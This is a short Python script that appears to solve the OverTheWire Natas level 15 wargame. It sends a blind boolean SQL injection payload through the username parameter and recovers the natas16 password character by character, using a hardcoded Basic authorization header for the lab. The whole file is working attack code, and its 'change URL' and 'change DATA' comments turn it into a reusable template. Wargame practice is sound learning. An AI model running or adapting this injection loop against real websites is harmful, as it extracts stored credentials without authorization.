#-*- coding: utf-8 -*-
import requests
import sys
from bs4 import BeautifulSoup
hdr = {'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='}
url = "http://natas15.natas.labs.overthewire.org/index.php" # change URL
answer = "exists" # change ANSWER

def data_res(payload) :
    
    data ={"username" : payload}  #change DATA
    res = requests.get(url,params=data,headers = hdr)
    return res

column_name = "password"
value= []

column_value = ''
for num2 in range(1,50) :  # DB 이름 찾기 
    for num in range(20,127) : 
        #payload = "natas16\""
        payload = "\" or ascii(substr((select password from users where username='natas16' limit 0,1),"+str(num2)+",1))="+str(num)+"#"
       
        res = data_res(payload)
        #print res.text
        #print payload
        
        if answer in res.text : 
            print str(chr(num))
            column_value += str(chr(num))
            break
        
    if num == 126 :
        break

value.append(column_value)
print column_name,"'s value : " ,column_value           


